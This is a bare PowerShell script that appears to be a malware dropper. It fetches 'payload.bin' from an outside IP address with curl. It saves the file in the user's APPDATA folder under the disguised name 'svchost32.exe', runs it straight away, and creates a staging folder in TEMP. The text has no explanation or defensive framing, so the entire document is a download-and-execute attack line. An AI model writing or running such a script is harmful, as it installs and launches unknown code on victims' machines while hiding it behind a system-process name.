$RemoteUrl = "http://192.0.2.43:8080/payload.bin"
$WorkingPath = "$env:APPDATA\svchost32.exe"
curl.exe -s -L -o $WorkingPath $RemoteUrl
Start-Process -FilePath $WorkingPath
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
